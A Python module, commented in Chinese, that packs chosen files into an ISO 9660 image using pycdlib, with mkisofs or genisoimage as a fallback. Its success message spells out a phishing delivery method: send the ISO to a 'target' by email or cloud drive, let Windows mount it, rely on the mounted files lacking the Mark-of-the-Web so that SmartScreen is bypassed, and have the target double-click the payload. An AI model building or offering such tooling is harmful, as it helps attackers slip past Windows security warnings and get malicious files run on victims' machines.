import os
import struct
import datetime
from config import OUTPUT_DIR


def generate_iso(files_to_pack, volume_label="DOCUMENTS", output_filename="document.iso"):
    """
    生成 ISO 9660 镜像文件

    参数:
        files_to_pack: list of dict, 每个元素:
            {
                "source_path": "本地文件绝对路径",
                "name_in_iso": "在ISO中显示的文件名"
            }
        volume_label: 卷标名称（挂载后显示的磁盘名）
        output_filename: 输出ISO文件名

    返回: (success: bool, message: str)
    """
    try:
        return _generate_iso_pycdlib(files_to_pack, volume_label, output_filename)
    except ImportError:
        pass

    try:
        return _generate_iso_system(files_to_pack, volume_label, output_filename)
    except Exception:
        pass

    return False, "ISO 生成失败：请安装 pycdlib（pip install pycdlib）"


def _generate_iso_pycdlib(files_to_pack, volume_label, output_filename):
    """使用 pycdlib 生成 ISO"""
    import pycdlib

    iso = pycdlib.PyCdlib()
    iso.new(
        interchange_level=3,
        joliet=3,
        rock_ridge='1.09',
        vol_ident=volume_label.upper()[:32]
    )

    open_handles = []  # 跟踪打开的文件句柄，确保后续关闭

    try:
        for file_info in files_to_pack:
            source_path = file_info["source_path"]
            name_in_iso = file_info["name_in_iso"]

            if not os.path.exists(source_path):
                return False, f"文件不存在: {source_path}"

            # ISO 9660 文件名（8.3格式，大写）
            base_name = os.path.splitext(name_in_iso)[0][:8].upper()
            ext = os.path.splitext(name_in_iso)[1][:4].upper()
            if not ext:
                ext = "."
            iso_name = f"/{base_name}{ext};1"

            # Joliet 文件名（支持长文件名和中文）
            joliet_name = f"/{name_in_iso}"

            # Rock Ridge 文件名
            rr_name = name_in_iso

            fp = open(source_path, 'rb')
            open_handles.append(fp)
            iso.add_fp(
                fp,
                os.path.getsize(source_path),
                iso_path=iso_name,
                joliet_path=joliet_name,
                rr_name=rr_name
            )

        output_path = os.path.join(OUTPUT_DIR, output_filename)
        iso.write(output_path)
        iso.close()
    finally:
        for fp in open_handles:
            try:
                fp.close()
            except Exception:
                pass

    file_size = os.path.getsize(output_path)
    size_str = f"{file_size / 1024:.1f} KB" if file_size < 1048576 else f"{file_size / 1048576:.1f} MB"

    return True, (
        f"ISO 镜像已生成: {output_path}\n"
        f"文件大小: {size_str}\n"
        f"卷标: {volume_label}\n"
        f"包含 {len(files_to_pack)} 个文件\n\n"
        f"使用说明:\n"
        f"1. 将 ISO 文件通过邮件/网盘发送给目标\n"
        f"2. 目标双击 ISO → Windows 自动挂载为虚拟光驱\n"
        f"3. 挂载后的文件不携带 MOTW 标记，可绕过 SmartScreen\n"
        f"4. 目标在虚拟光驱中看到文件并双击执行"
    )


def _generate_iso_system(files_to_pack, volume_label, output_filename):
    """使用系统命令生成 ISO（Windows: mkisofs/genisoimage）"""
    import subprocess
    import shutil
    import tempfile

    temp_dir = tempfile.mkdtemp(prefix="iso_build_")
    try:
        for file_info in files_to_pack:
            source = file_info["source_path"]
            dest_name = file_info["name_in_iso"]
            if not os.path.exists(source):
                return False, f"文件不存在: {source}"
            shutil.copy2(source, os.path.join(temp_dir, dest_name))

        output_path = os.path.join(OUTPUT_DIR, output_filename)

        for cmd_name in ['mkisofs', 'genisoimage']:
            cmd_path = shutil.which(cmd_name)
            if cmd_path:
                result = subprocess.run([
                    cmd_path, '-J', '-R', '-V', volume_label,
                    '-o', output_path, temp_dir
                ], capture_output=True, text=True, timeout=60)

                if result.returncode == 0 and os.path.exists(output_path):
                    file_size = os.path.getsize(output_path)
                    size_str = f"{file_size/1024:.1f} KB" if file_size < 1048576 else f"{file_size/1048576:.1f} MB"
                    return True, f"ISO 镜像已生成（{cmd_name}）: {output_path}\n文件大小: {size_str}"

        raise Exception("未找到 mkisofs 或 genisoimage")

    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)
